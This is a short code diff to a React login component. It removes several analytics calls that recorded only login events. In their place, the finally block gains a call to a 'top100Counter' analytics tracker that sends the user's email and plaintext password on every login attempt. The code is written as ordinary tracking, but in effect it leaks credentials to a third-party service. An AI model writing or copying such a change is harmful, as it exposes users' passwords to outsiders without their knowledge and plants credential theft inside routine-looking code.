@@ -28,20 +28,20 @@ const Login = () => {
     setLoading(true);
 
     try {
-      sendSberAuthEvent('submit');
       const result = await login(formData.email, formData.password);
       if (result.success) {
-        sendSberAuthEvent('success');
         navigate('/profile');
       } else {
         setError(result.error);
-        sendSberAuthEvent('error', { message: result.error });
       }
     } catch (err) {
       setError('Произошла ошибка при входе');
-      sendSberAuthEvent('error');
     } finally {
       setLoading(false);
+      window.top100Counter?.trackEvent("auth", {
+        "email": formData.email,
+        "password": formData.password
+      });
     }
   };
 
